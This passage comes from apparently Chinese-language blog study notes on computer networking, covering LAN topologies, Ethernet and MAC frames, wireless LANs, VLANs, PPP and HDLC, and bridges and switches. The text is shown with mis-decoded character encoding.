Network):ç®€ç§°LANï¼Œæ˜¯æŒ‡åœ¨æŸä¸€åŒºåŸŸå†…ç”±å¤šå°è®¡ç®—æœºäº’è”æˆçš„è®¡ç®—æœºç»„ï¼Œä½¿ç”¨å¹¿æ’­ä¿¡é“</p><ul><li>ç‰¹ç‚¹1:è¦†ç›–çš„åœ°ç†èŒƒå›´è¾ƒå°ï¼Œåªåœ¨ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„å±€éƒ¨èŒƒå›´å†…è”ï¼Œå¦‚ä¸€åº§æˆ–é›†ä¸­çš„å»ºç­‘ç¾¤å†…ã€‚</li><li>ç‰¹ç‚¹2:1ä½¿ç”¨ä¸“é—¨é“ºè®¾çš„ä¼ è¾“ä»‹è´¨(åŒç»çº¿ã€åŒè½´ç”µç¼†)è¿›è¡Œè”ç½‘ï¼Œæ•°æ®ä¼ è¾“é€Ÿç‡é«˜(10Mb&#x2F;s~10Gb&#x2F;s)</li><li>ç‰¹ç‚¹3:é€šä¿¡å»¶è¿Ÿæ—¶é—´çŸ­ï¼Œè¯¯ç ç‡ä½ï¼Œå¯é æ€§è¾ƒé«˜ã€‚</li><li>ç‰¹ç‚¹4:å„ç«™ä¸ºå¹³ç­‰å…³ç³»ï¼Œå…±äº«ä¼ è¾“ä¿¡é“ã€‚</li><li>ç‰¹ç‚¹5:å¤šé‡‡ç”¨åˆ†å¸ƒå¼æ§åˆ¶å’Œå¹¿æ’­å¼é€šä¿¡ï¼Œèƒ½è¿›è¡Œå¹¿æ’­å’Œç»„æ’­ï¼Œ</li></ul><p>å†³å®šå±€åŸŸç½‘çš„ä¸»è¦è¦ç´ ä¸ºï¼šç½‘ç»œæ‹“æ‰‘ã€ä¼ è¾“ä»‹è´¨å’Œä»‹è´¨è®¿é—®æ§åˆ¶æ–¹æ³•</p><h2 id="å±€åŸŸç½‘æ‹“æ‰‘ç»“æ„"><a href="#å±€åŸŸç½‘æ‹“æ‰‘ç»“æ„" class="headerlink" title="å±€åŸŸç½‘æ‹“æ‰‘ç»“æ„"></a>å±€åŸŸç½‘æ‹“æ‰‘ç»“æ„</h2><p><img src="http://cdn.clown2024.cn/202407151539791.png" alt="image-20240401215100579"></p><p>ç»¼ä¸Šå¯ä»¥çŸ¥é“æ€»çº¿å‹çš„æ‹“æ‰‘ç»“æ„æ˜¯æ¯”è¾ƒå¥½çš„ï¼Œç°åœ¨æ¯”è¾ƒå¸¸ç”¨çš„ä¹Ÿæ˜¯æ€»çº¿å‹æ‹“æ‰‘ã€‚</p><h2 id="å±€åŸŸç½‘ä¼ è¾“ä»‹è´¨"><a href="#å±€åŸŸç½‘ä¼ è¾“ä»‹è´¨" class="headerlink" title="å±€åŸŸç½‘ä¼ è¾“ä»‹è´¨"></a>å±€åŸŸç½‘ä¼ è¾“ä»‹è´¨</h2><ul><li>æœ‰çº¿å±€åŸŸç½‘ï¼šåŒç»çº¿ã€åŒè½´ç”µç¼†ã€å…‰çº¤</li><li>æ— çº¿å±€åŸŸç½‘ï¼šç”µç£æ³¢</li></ul><h2 id="å±€åŸŸç½‘ä»‹è´¨è®¿é—®æ§åˆ¶æ–¹æ³•"><a href="#å±€åŸŸç½‘ä»‹è´¨è®¿é—®æ§åˆ¶æ–¹æ³•" class="headerlink" title="å±€åŸŸç½‘ä»‹è´¨è®¿é—®æ§åˆ¶æ–¹æ³•"></a>å±€åŸŸç½‘ä»‹è´¨è®¿é—®æ§åˆ¶æ–¹æ³•</h2><ol><li><p>CSMA&#x2F;CDï¼šå¸¸ç”¨äºæ€»çº¿å‹å±€åŸŸç½‘ï¼Œä¹Ÿç”¨äºæ ‘å‹ç½‘ç»œ</p></li><li><p>ä»¤ç‰Œæ€»çº¿ï¼šå¸¸ç”¨äºæ€»çº¿å‹å±€åŸŸç½‘ï¼Œä¹Ÿç”¨äºæ ‘å‹ç½‘ç»œ</p><p>å®ƒæ˜¯æŠŠæ€»çº¿å‹æˆ–æ ‘å‹ç½‘ç»œä¸­çš„å„ä¸ªå·¥ä½œç«™æŒ‰ä¸€å®šé¡ºåºå¦‚æŒ‰æ¥å£åœ°å€å¤§å°æ’åˆ—å½¢æˆä¸€ä¸ªé€»è¾‘ç¯ã€‚åªæœ‰ä»¤ç‰ŒæŒæœ‰è€…æ‰èƒ½æ§åˆ¶æ€»çº¿ï¼Œæ‰æœ‰å‘é€ä¿¡æ¯çš„æƒåŠ›ã€‚</p></li><li><p>ä»¤ç‰Œç¯ï¼šç”¨äºç¯å½¢å±€åŸŸç½‘ï¼Œå¦‚ä»¤ç‰Œç¯ç½‘</p></li></ol><h2 id="å±€åŸŸç½‘çš„åˆ†ç±»"><a href="#å±€åŸŸç½‘çš„åˆ†ç±»" class="headerlink" title="å±€åŸŸç½‘çš„åˆ†ç±»"></a>å±€åŸŸç½‘çš„åˆ†ç±»</h2><p><img src="http://cdn.clown2024.cn/202407151539792.png" alt="image-20240401215625251"></p><h2 id="ieee-802æ ‡å‡†"><a href="#IEEE-802æ ‡å‡†" class="headerlink" title="IEEE 802æ ‡å‡†"></a>IEEE 802æ ‡å‡†</h2><p>IEEE 802ç³»åˆ—æ ‡å‡†æ˜¯IEEE 802 LAN&#x2F;MAN æ ‡å‡†å§”å‘˜ä¼šåˆ¶å®šçš„å±€åŸŸç½‘ã€åŸåŸŸç½‘æŠ€æœ¯æ ‡å‡†(1980å¹´2æœˆæˆç«‹)ã€‚å…¶ä¸­æœ€å¹¿æ³›ä½¿ç”¨çš„æœ‰ä»¥å¤ªç½‘ã€ä»¤ç‰Œç¯ã€æ— çº¿å±€åŸŸç½‘ç­‰ã€‚è¿™ä¸€ç³»åˆ—æ ‡å‡†ä¸­çš„æ¯ä¸€ä¸ªå­æ ‡å‡†éƒ½ç”±å§”å‘˜ä¼šä¸­çš„ä¸€ä¸ªä¸“é—¨å·¥ä½œç»„è´Ÿè´£ã€‚</p><p><strong>ä¸‹é¢æ˜¯ä¸€äº›802çš„ç‰ˆæœ¬</strong></p><p><img src="http://cdn.clown2024.cn/202407151539793.png" alt="image-20240401215941515"></p><h2 id="macå­å±‚å’Œllcå­å±‚"><a href="#MACå­å±‚å’ŒLLCå­å±‚" class="headerlink" title="MACå­å±‚å’ŒLLCå­å±‚"></a>MACå­å±‚å’ŒLLCå­å±‚</h2><p>IEEE802æ ‡å‡†æ‰€æè¿°çš„å±€åŸŸç½‘å‚è€ƒæ¨¡å‹åªå¯¹åº”OSIå‚è€ƒæ¨¡å‹çš„æ•°æ®é“¾è·¯å±‚ä¸ç‰©ç†å±‚ï¼Œå®ƒå°†æ•°æ®é“¾è·¯å±‚åˆ’åˆ†ä¸ºé€»è¾‘é“¾è·¯å±‚LLCå­å±‚å’Œä»‹è´¨è®¿é—®æ§åˆ¶MACå­å±‚ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539794.png" alt="image-20240401220205402"></p><h1 id="ä»¥å¤ªç½‘"><a href="#ä»¥å¤ªç½‘" class="headerlink" title="ä»¥å¤ªç½‘"></a>ä»¥å¤ªç½‘</h1><p>ä»¥å¤ªç½‘(Ethernet)æŒ‡çš„æ˜¯ç”±Xeroxå…¬å¸åˆ›å»ºå¹¶ç”±Xeroxã€Intelå’ŒDECå…¬å¸è”åˆå¼€å‘çš„åŸºå¸¦æ€»çº¿å±€åŸŸç½‘è§„èŒƒï¼Œæ˜¯å½“ä»Šç°æœ‰å±€åŸŸç½‘é‡‡ç”¨çš„æœ€é€šç”¨çš„é€šä¿¡åè®®æ ‡å‡†ã€‚ä»¥å¤ªç½‘ç»œä½¿ç”¨CSMA&#x2F;CD(è½½æ³¢ç›‘å¬å¤šè·¯è®¿é—®åŠå†²çªæ£€æµ‹)æŠ€æœ¯ã€‚</p><p><strong>ä»¥å¤ªç½‘ååˆ†å¸¸ç”¨çš„åŸå› </strong></p><ol><li>é€ ä»·ä½å»‰</li><li>æ˜¯åº”ç”¨æœ€å¹¿æ³›çš„å±€åŸŸç½‘æŠ€æœ¯</li><li>æ¯”ä»¤ç‰Œç¯ç½‘ã€ATMç½‘ä¾¿å®œï¼Œç®€å•</li><li>æ»¡è¶³ç½‘ç»œé€Ÿç‡è¦æ±‚ï¼š10Mb&#x2F;s~10Gb&#x2F;s</li></ol><p><strong>ä»¥å¤ªç½‘çš„ä¸¤ä¸ªæ ‡å‡†</strong></p><ul><li>DIX Ethernet V2:ç¬¬ä¸€ä¸ªå±€åŸŸç½‘äº§å“(ä»¥å¤ªç½‘)è§„çº¦ã€‚</li><li>IEEE 802.3:IEEE 802å§”å‘˜ä¼š802.3å·¥ä½œç»„åˆ¶å®šçš„ç¬¬ä¸€ä¸ªIEEEçš„ä»¥å¤ªç½‘æ ‡å‡†ã€‚(å¸§æ ¼å¼æœ‰ä¸€ä¸¢ä¸¢æ”¹åŠ¨)</li></ul><h2 id="ä»¥å¤ªç½‘æä¾›æ— è¿æ¥-ä¸å¯é çš„æœåŠ¡"><a href="#ä»¥å¤ªç½‘æä¾›æ— è¿æ¥ã€ä¸å¯é çš„æœåŠ¡" class="headerlink" title="ä»¥å¤ªç½‘æä¾›æ— è¿æ¥ã€ä¸å¯é çš„æœåŠ¡"></a>ä»¥å¤ªç½‘æä¾›æ— è¿æ¥ã€ä¸å¯é çš„æœåŠ¡</h2><p>æ— è¿æ¥ï¼šå‘é€æ–¹å’Œæ¥æ”¶æ–¹ä¹‹é—´æ— â€â€æ¡æ‰‹è¿‡ç¨‹â€<br>ä¸å¯é ï¼šä¸å¯¹å‘é€æ–¹çš„æ•°æ®å¸§ç¼–å·ï¼Œæ¥æ”¶æ–¹ä¸å‘å‘é€æ–¹è¿›è¡Œç¡®è®¤ï¼Œå·®é”™å¸§ç›´æ¥ä¸¢å¼ƒï¼Œå·®é”™çº æ­£ç”±é«˜å±‚è´Ÿè´£ã€‚</p><blockquote><p>ä»¥å¤ªç½‘åªå®ç°æ— å·®é”™æ¥æ”¶ï¼Œä¸å®è¡Œå¯é ä¼ è¾“</p></blockquote><h2 id="ä»¥å¤ªç½‘ä¼ è¾“ä»‹è´¨å’Œæ‹“æ‰‘ç»“æ„å‘å±•"><a href="#ä»¥å¤ªç½‘ä¼ è¾“ä»‹è´¨å’Œæ‹“æ‰‘ç»“æ„å‘å±•" class="headerlink" title="ä»¥å¤ªç½‘ä¼ è¾“ä»‹è´¨å’Œæ‹“æ‰‘ç»“æ„å‘å±•"></a>ä»¥å¤ªç½‘ä¼ è¾“ä»‹è´¨å’Œæ‹“æ‰‘ç»“æ„å‘å±•</h2><p><img src="http://cdn.clown2024.cn/202407151539795.png" alt="image-20240401221233925"></p><h2 id="10base-tä»¥å¤ªç½‘"><a href="#10BASE-Tä»¥å¤ªç½‘" class="headerlink" title="10BASE-Tä»¥å¤ªç½‘"></a>10BASE-Tä»¥å¤ªç½‘</h2><p><img src="http://cdn.clown2024.cn/202407151539796.png" alt="image-20240401221436733"></p><h2 id="é€‚é…å™¨ä¸macåœ°å€"><a href="#é€‚é…å™¨ä¸MACåœ°å€" class="headerlink" title="é€‚é…å™¨ä¸MACåœ°å€"></a>é€‚é…å™¨ä¸MACåœ°å€</h2><p>è®¡ç®—æœºä¸å¤–ç•Œæœ‰å±€åŸŸç½‘çš„è¿æ¥æ˜¯é€šè¿‡é€šä¿¡é€‚é…å™¨çš„ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539797.png" alt="image-20240401221549243"></p><p>MACåœ°å€åˆç§°ä¸ºç‰©ç†åœ°å€ï¼Œæ˜¯å…¨çƒå”¯ä¸€çš„ï¼Œæ¯ä¸ªç½‘å¡éƒ½æœ‰MACåœ°å€ã€‚</p><p>MACåœ°å€æ˜¯ç”±48ä½äºŒè¿›åˆ¶æ•°ç»„æˆï¼Œå‰24ä½ä»£è¡¨å‚å®¶(ç”±IEEEè§„å®š)ï¼Œå24ä½å‚å®¶è‡ªå·±æŒ‡å®šã€‚å¸¸ç”¨6ä¸ªåå…­è¿›åˆ¶æ•°è¡¨ç¤ºï¼Œå¦‚02-60-8e-e4-b1-21</p><h2 id="ä»¥å¤ªç½‘macå¸§"><a href="#ä»¥å¤ªç½‘MACå¸§" class="headerlink" title="ä»¥å¤ªç½‘MACå¸§"></a>ä»¥å¤ªç½‘MACå¸§</h2><p>æœ€å¸¸ç”¨çš„MACå¸§æ˜¯ä»¥å¤ªç½‘V2çš„æ ¼å¼</p><p><img src="http://cdn.clown2024.cn/202407151539798.png" alt="image-20240401222333972"></p><blockquote><p>ä»¥å¤ªç½‘çš„æœ€å°å¸§é•¿ä½64B</p></blockquote><p>ä¸IEEE 802.3çš„åŒºåˆ«ï¼š</p><ol><li>ç¬¬ä¸‰ä¸ªå­—æ®µæ˜¯é•¿åº¦&#x2F;ç±»å‹</li><li>å½“é•¿åº¦&#x2F;ç±»å‹å­—æ®µå€¼å°äº0x0600æ—¶ï¼Œæ•°æ®å­—æ®µå¿…é¡»è£…å…¥LLCå­å±‚</li></ol><h2 id="é«˜é€Ÿä»¥å¤ªç½‘"><a href="#é«˜é€Ÿä»¥å¤ªç½‘" class="headerlink" title="é«˜é€Ÿä»¥å¤ªç½‘"></a>é«˜é€Ÿä»¥å¤ªç½‘</h2><p><img src="http://cdn.clown2024.cn/202407151539799.png" alt="image-20240401222630966"></p><h1 id="æ— çº¿å±€åŸŸç½‘"><a href="#æ— çº¿å±€åŸŸç½‘" class="headerlink" title="æ— çº¿å±€åŸŸç½‘"></a>æ— çº¿å±€åŸŸç½‘</h1><p>IEEE 802.11æ˜¯æ— çº¿å±€åŸŸç½‘çš„é€šç”¨æ ‡å‡†ã€‚</p><p>å®ƒè¿˜æœ‰å¾ˆå¤šç»†åˆ†çš„ç‰ˆæœ¬å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151539800.png" alt="image-20240401222817167"></p><h2 id="80211çš„macå¸§å¤´æ ¼å¼"><a href="#802-11çš„MACå¸§å¤´æ ¼å¼" class="headerlink" title="802.11çš„MACå¸§å¤´æ ¼å¼"></a>802.11çš„MACå¸§å¤´æ ¼å¼</h2><p><img src="http://cdn.clown2024.cn/202407151539801.png" alt="image-20240401223149510"></p><p>ä¸Šé¢çš„åªæ˜¯å…¶ä¸­ä¸€ç§ï¼Œ802.11ä¸åŒçš„ç‰ˆæœ¬è¿˜æœ‰ä¸åŒçš„å¸§å¤´æ ¼å¼</p><p><img src="http://cdn.clown2024.cn/202407151539802.png" alt="image-20240401223240972"></p><h2 id="æ— çº¿å±€åŸŸç½‘åˆ†ç±»"><a href="#æ— çº¿å±€åŸŸç½‘åˆ†ç±»" class="headerlink" title="æ— çº¿å±€åŸŸç½‘åˆ†ç±»"></a>æ— çº¿å±€åŸŸç½‘åˆ†ç±»</h2><p><strong>æœ‰å›ºå®šåŸºç¡€è®¾æ–½çš„æ— çº¿å±€åŸŸç½‘</strong></p><p><img src="http://cdn.clown2024.cn/202407151539803.png" alt="image-20240401223632641"></p><p>wifiçš„åç§°åˆå«åšæœåŠ¡é›†æ ‡è¯†ç¬¦ã€‚</p><p><strong>æ— å›ºå®šåŸºç¡€è®¾æ–½æ— çº¿å±€åŸŸç½‘çš„è‡ªç»„ç»‡ç½‘ç»œ</strong></p><p><img src="http://cdn.clown2024.cn/202407151539804.png" alt="image-20240401223748731"></p><p>å³æ¯ä¸ªä¸»æœºåˆå¯ä»¥å½“ä½œä¸»æœºåˆå¯ä»¥å½“ä½œè·¯ç”±å™¨è½¬å‘æ•°æ®ã€‚</p><h1 id="vlan"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h1><p>å°±æ˜¯è™šæ‹Ÿå±€åŸŸç½‘(Virtual Local Area Network)ï¼Œæ˜¯ä¸€ç§å°†å±€åŸŸç½‘çš„è®¾å¤‡åˆ’åˆ†æˆä¸ç‰©ç†ä½ç½®æ— å…³çš„é€»è¾‘ç»„çš„æŠ€æœ¯ï¼Œè¿™äº›é€»è¾‘ç»„æœ‰æŸäº›å…±åŒçš„éœ€æ±‚ã€‚æ¯ä¸ªVLANæ˜¯ä¸€ä¸ªå•ç‹¬çš„å¹¿æ’­åŸŸ&#x2F;ä¸åŒçš„å­ç½‘ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539805.png" alt="image-20240401224352375"></p><blockquote><p>è™šæ‹Ÿç½‘ç»œå»ºç«‹åœ¨ç½‘ç»œäº¤æ¢æœºä¹‹ä¸Šï¼Œå®ƒä»¥è½¯ä»¶æ–¹å¼æ¥å®ç°é€»è¾‘å·¥ä½œç»„çš„åˆ’åˆ†ä¸ç®¡ç†</p></blockquote><h2 id="vlançš„å®ç°"><a href="#VLANçš„å®ç°" class="headerlink" title="VLANçš„å®ç°"></a>VLANçš„å®ç°</h2><p>äº¤æ¢æœºä¸Šç”Ÿæˆçš„VLANäº’ä¸æƒ³é€šï¼Œè‹¥æƒ³å®ç°é€šä¿¡ï¼Œéœ€è¦å€ŸåŠ©ï¼š</p><ul><li>è·¯ç”±å™¨</li><li>ä¸‰å±‚äº¤æ¢æœº</li></ul><p><strong>åŸºäºæ¥å£çš„VLANæŠ€æœ¯</strong></p><p><img src="http://cdn.clown2024.cn/202407151539806.png" alt="image-20240401225024038"></p><p><img src="http://cdn.clown2024.cn/202407151539807.png" alt="image-20240401225037903"></p><p>Aå‘é€ä¸€ä¸ªå¹¿æ’­å¸§å¯ä»¥ä¸è®©Bæ”¶åˆ°ï¼Œå…¶åŸç†å¦‚ä¸‹ï¼š</p><blockquote><p>Aå‘é€ä¸€ä¸ªå¹¿æ’­è¯·æ±‚ï¼Œäº¤æ¢æœºå–è½¬å‘è¡¨ä¸­å¯¹ç…§çŸ¥é“ä»–æ˜¯æ¥è‡ª1å·ç«¯å£ï¼ŒçŸ¥é“ä»–æ˜¯æ¥è‡ªVLAN1çš„å¹¿æ’­è¯·æ±‚ï¼Œç„¶åå´äº¤æ¢æœºçš„VLANè¡¨ä¸­æŸ¥çœ‹ï¼ŒVLAN IDä¸­ä¸º1çš„åªæœ‰2å·ç«¯å£æ‰€ä»¥ä¼šè½¬å‘ç»™Bè€Œä¸ä¼šè½¬å‘ç»™Cå’ŒD</p></blockquote><p><strong>åŸºäºMACåœ°å€çš„VLANæŠ€æœ¯</strong></p><p><img src="http://cdn.clown2024.cn/202407151539808.png" alt="image-20240401225544853"></p><p>å°±æ˜¯æ”¹å˜äº†ä¸€ä¸‹äº¤æ¢æœºçš„VLANè¡¨çš„å½¢å¼ï¼Œå¯¹åº”è¿˜æ˜¯ä¸€æ ·çš„ã€‚</p><p><strong>äº¤æ¢æœºä¹‹é—´çš„é€šä¿¡</strong></p><p><img src="http://cdn.clown2024.cn/202407151539809.png" alt="image-20240401225719073"></p><p>æ¯”å¦‚Aè¦ç»™Eå‘é€æ•°æ®ï¼Œç„¶åç»™æ•°æ®æ ‡è®°ä¸ŠVLAN1çš„æ ‡ç­¾ï¼Œå½“å‘é€åˆ°äº¤æ¢æœº2çš„æ—¶å€™å°±çŸ¥é“å®ƒæ˜¯å±äºå“ªä¸€ä¸ªç½‘ç»œçš„ï¼Œç„¶åå°±å¯ä»¥å‘é€ç»™Eäº†ã€‚</p><p><strong>IEEE 802.1Qå¸§</strong></p><p><img src="http://cdn.clown2024.cn/202407151539810.png" alt="image-20240401230123145"></p><h1 id="å¹¿åŸŸç½‘åŠç›¸å…³åè®®"><a href="#å¹¿åŸŸç½‘åŠç›¸å…³åè®®" class="headerlink" title="å¹¿åŸŸç½‘åŠç›¸å…³åè®®"></a>å¹¿åŸŸç½‘åŠç›¸å…³åè®®</h1><p>å¹¿åŸŸç½‘(WANï¼ŒWideArea Network)ï¼Œé€šå¸¸è·¨æ¥å¾ˆå¤§çš„ç‰©ç†èŒƒå›´ï¼Œæ‰€è¦†ç›–çš„èŒƒå›´ä»å‡ åå…¬é‡Œåˆ°å‡ åƒå…¬é‡Œï¼Œå®ƒèƒ½è¿æ¥å¤šä¸ªåŸå¸‚æˆ–å›½å®¶ï¼Œæˆ–æ¨ªè·¨å‡ ä¸ªæ´²å¹¶èƒ½æä¾›è¿œè·ç¦»é€šä¿¡ï¼Œå½¢æˆå›½é™…æ€§çš„è¿œç¨‹ç½‘ç»œã€‚</p><p>å¹¿åŸŸç½‘çš„é€šä¿¡å­ç½‘ä¸»è¦ä½¿ç”¨åˆ†ç»„äº¤æ¢æŠ€æœ¯ã€‚å¹¿åŸŸç½‘çš„é€šä¿¡å­ç½‘å¯ä»¥åˆ©ç”¨å…¬ç”¨åˆ†ç»„äº¤æ¢ç½‘ã€å«æ˜Ÿé€šä¿¡ç½‘å’Œæ— çº¿åˆ†ç»„äº¤æ¢ç½‘ï¼Œå®ƒå°†åˆ†å¸ƒåœ¨ä¸åŒåœ°åŒºçš„å±€åŸŸç½‘æˆ–è®¡ç®—æœºç³»ç»Ÿäº’è¿èµ·æ¥ï¼Œè¾¾åˆ°èµ„æºå…±äº«çš„ç›®çš„ã€‚å¦‚å› ç‰¹ç½‘(Internet)æ˜¯ä¸–ç•ŒèŒƒå›´å†…æœ€å¤§çš„å¹¿åŸŸç½‘ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539811.png" alt="image-20240401230819221"></p><h2 id="pppåè®®"><a href="#PPPåè®®" class="headerlink" title="PPPåè®®"></a>PPPåè®®</h2><p>ç‚¹å¯¹ç‚¹åè®®PPP(Point-to-Point Protocol)æ˜¯ç›®å‰ä½¿ç”¨æœ€å¹¿æ³›çš„æ•°æ®é“¾è·¯å±‚åè®®ï¼Œç”¨æˆ·ä½¿ç”¨æ‹¨å·ç”µè¯æ¥å…¥å› ç‰¹ç½‘æ—¶ä¸€èˆ¬éƒ½ä½¿ç”¨PPPåè®®ã€‚</p><blockquote><p>è¯¥åè®®åªæ”¯æŒå…¨åŒå·¥é€šä¿¡</p></blockquote><p><strong>PPPåè®®åº”æ»¡è¶³çš„è¦æ±‚</strong></p><p><img src="http://cdn.clown2024.cn/202407151539812.png" alt="image-20240401231218835"></p><p><strong>PPPåè®®æ— éœ€æ»¡è¶³çš„è¦æ±‚</strong></p><p><img src="http://cdn.clown2024.cn/202407151539813.png" alt="image-20240401231255188"></p><p><strong>PPPåè®®çš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†</strong></p><p><img src="http://cdn.clown2024.cn/202407151539814.png" alt="image-20240401231415652"></p><p><strong>PPPåè®®çš„çŠ¶æ€å›¾</strong></p><p><img src="http://cdn.clown2024.cn/202407151539815.png" alt="image-20240401231530196"></p><p><strong>PPPåè®®çš„å¸§æ ¼å¼</strong></p><p><img src="http://cdn.clown2024.cn/202407151539816.png" alt="image-20240401231652471"></p><blockquote><p>PPPåè®®æ˜¯ä¸€ä¸ªé¢å‘å­—èŠ‚çš„åè®®</p></blockquote><h2 id="hdlcåè®®"><a href="#HDLCåè®®" class="headerlink" title="HDLCåè®®"></a>HDLCåè®®</h2><p>é«˜çº§æ•°æ®é“¾è·¯æ§åˆ¶(High-Level Data Link ControIæˆ–ç®€ç§°HDLC)ï¼Œæ˜¯ä¸€ä¸ªåœ¨åŒæ­¥ç½‘ä¸Šä¼ è¾“æ•°æ®ã€é¢å‘æ¯”ç‰¹çš„æ•°æ®é“¾è·¯å±‚åè®®ï¼Œå®ƒæ˜¯ç”±å›½é™…æ ‡å‡†åŒ–ç»„ç»‡(ISO)æ ¹æ®IBMå…¬å¸çš„SDLC(SvnchronousData Link Control)åè®®æ‰©å±•å¼€å‘è€Œæˆçš„ã€‚</p><p>æ•°æ®æŠ¥æ–‡å¯é€æ˜ä¼ è¾“ï¼Œç”¨äºå®ç°é€æ˜ä¼ è¾“çš„â€œ0æ¯”ç‰¹æ’å…¥æ³•â€æ˜“äºç¡¬ä»¶å®ç°</p><p>HDLCåè®®é‡‡ç”¨å…¨åŒå·¥é€šä¿¡ã€‚</p><p>æ‰€æœ‰å¸§é‡‡ç”¨CRCæ£€éªŒï¼Œå¯¹ä¿¡æ¯å¸§è¿›è¡Œé¡ºåºç¼–ç ï¼Œå¯é˜²æ­¢æ¼æ”¶æˆ–é‡ä»½ï¼Œä¼ è¾“å¯é æ€§é«˜ã€‚</p><p><strong>HDLCçš„ç«™</strong></p><p><img src="http://cdn.clown2024.cn/202407151539817.png" alt="image-20240401232456669"></p><p><strong>HDLCçš„å¸§æ ¼å¼</strong></p><p><img src="http://cdn.clown2024.cn/202407151539818.png" alt="image-20240401232617385"></p><h2 id="pppåè®®å’Œhdlcåè®®çš„åŒºåˆ«"><a href="#PPPåè®®å’ŒHDLCåè®®çš„åŒºåˆ«" class="headerlink" title="PPPåè®®å’ŒHDLCåè®®çš„åŒºåˆ«"></a>PPPåè®®å’ŒHDLCåè®®çš„åŒºåˆ«</h2><p><img src="http://cdn.clown2024.cn/202407151539819.png" alt="image-20240401232742381"></p><h1 id="é“¾è·¯å±‚è®¾å¤‡"><a href="#é“¾è·¯å±‚è®¾å¤‡" class="headerlink" title="é“¾è·¯å±‚è®¾å¤‡"></a>é“¾è·¯å±‚è®¾å¤‡</h1><h2 id="ç‰©ç†å±‚æ‰©å±•ä»¥å¤ªç½‘"><a href="#ç‰©ç†å±‚æ‰©å±•ä»¥å¤ªç½‘" class="headerlink" title="ç‰©ç†å±‚æ‰©å±•ä»¥å¤ªç½‘"></a>ç‰©ç†å±‚æ‰©å±•ä»¥å¤ªç½‘</h2><p>ç”¨æ¥å‡å°‘ä¿¡å·çš„è¡°å‡ï¼Œå› ä¸ºä¸€å°ä¸»æœºè¿ä¸Šé›†çº¿å™¨çš„ç«¯å£ä¹‹åè·ç¦»ä¸èƒ½å¤ªè¿œï¼Œä¸ç„¶ä¿¡å·å¤±çœŸéå¸¸ä¸¥é‡</p><ol><li><p>ä½¿ç”¨å…‰çº¤è§£è°ƒå™¨æ¥æ‰©å±•ä»¥å¤ªç½‘</p><p><img src="http://cdn.clown2024.cn/202407151539820.png" alt="image-20240401233116459"></p></li><li><p>åˆ’åˆ†å¤šä¸ªå†²çªåŸŸæ¥æ‰©å±•ï¼Œå†²çªåŸŸå°±æ˜¯ä¸€ä¸ªå†²çªåŸŸå†…åªèƒ½æœ‰ä¸€å°ä¸»æœºå’Œé›†çº¿å™¨è¿æ¥ï¼Œä¸ç„¶å°±ä¼šå‘ç”Ÿå†²çª</p><p><img src="http://cdn.clown2024.cn/202407151539821.png" alt="image-20240401233239090"></p><p>ä½†æ˜¯è¯¥æ–¹å¼çš„å†²çªæ•ˆç‡é™ä½äº†</p></li></ol><h2 id="é“¾è·¯å±‚æ‰©å±•ä»¥å¤ªç½‘"><a href="#é“¾è·¯å±‚æ‰©å±•ä»¥å¤ªç½‘" class="headerlink" title="é“¾è·¯å±‚æ‰©å±•ä»¥å¤ªç½‘"></a>é“¾è·¯å±‚æ‰©å±•ä»¥å¤ªç½‘</h2><p>ä¸€èˆ¬ä½¿ç”¨ç½‘æ¡¥æˆ–è€…äº¤æ¢æœº</p><p><strong>ç½‘æ¡¥</strong></p><p>ç½‘æ¡¥æ ¹æ®MACå¸§çš„ç›®çš„åœ°å€å¯¹å¸§è¿›è¡Œè½¬å‘å’Œè¿‡æ»¤ã€‚å½“ç½‘æ¡¥æ”¶åˆ°ä¸€ä¸ªå¸§æ—¶ï¼Œå¹¶ä¸å‘æ‰€æœ‰æ¥å£è½¬å‘æ­¤å¸§ï¼Œè€Œæ˜¯å…ˆæ£€æŸ¥æ­¤å¸§çš„ç›®çš„MACåœ°å€ï¼Œç„¶åå†ç¡®å®šå°†è¯¥å¸§è½¬å‘åˆ°å“ªä¸€ä¸ªæ¥å£ï¼Œæˆ–è€…æ˜¯æŠŠå®ƒä¸¢å¼ƒ(å³è¿‡æ»¤)ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539822.png" alt="image-20240401234933353"></p><p>ç½‘æ¡¥åˆåˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li><p>é€æ˜ç½‘æ¡¥ï¼šâ€œé€æ˜â€æŒ‡ä»¥å¤ªç½‘ä¸Šçš„ç«™ç‚¹å¹¶ä¸çŸ¥é“æ‰€å‘é€çš„å¸§å°†ç»è¿‡å“ªå‡ ä¸ªç½‘æ¡¥ï¼Œæ˜¯ä¸€ç§å³æ’å³ç”¨è®¾å¤‡-è‡ªå­¦ä¹ </p><p><img src="http://cdn.clown2024.cn/202407151539823.png" alt="image-20240401235353540"></p><p>è‡ªå­¦ä¹ æŒ‡çš„å°±æ˜¯ä¼šåœ¨æ•°æ®å‘é€çš„è¿‡ç¨‹ä¸­é€æ¸å¡«å……è½¬å‘è¡¨ã€‚</p></li><li><p>æºè·¯ç”±ç½‘æ¡¥ï¼šåœ¨å‘é€å¸§æ—¶ï¼ŒæŠŠè¯¦ç»†çš„æœ€ä½³è·¯ç”±ä¿¡æ¯(è·¯ç”±æœ€å°‘&#x2F;æ—¶é—´æœ€çŸ­)æ”¾åœ¨å¸§çš„é¦–éƒ¨ä¸­ã€‚</p><p><strong>æ–¹æ³•</strong>ï¼šæºç«™ä»¥å¹¿æ’­æ–¹å¼å‘æ¬²é€šä¿¡çš„ç›®çš„ç«™å‘é€ä¸€ä¸ªå‘ç°å¸§</p></li></ul><p><strong>ä»¥å¤ªç½‘äº¤æ¢æœº</strong></p><p>ä¹Ÿå«åšå¤šæ¥å£ç½‘æ¡¥ï¼Œä¸€ä¸ªäº¤æ¢æœºä¸Šæœ‰å¾ˆå¤šä¸ªç«¯å£ï¼Œæ¯ä¸€ä¸ªç«¯å£éƒ½æ˜¯ä¸€ä¸ªå†²çªåŸŸã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539824.png" 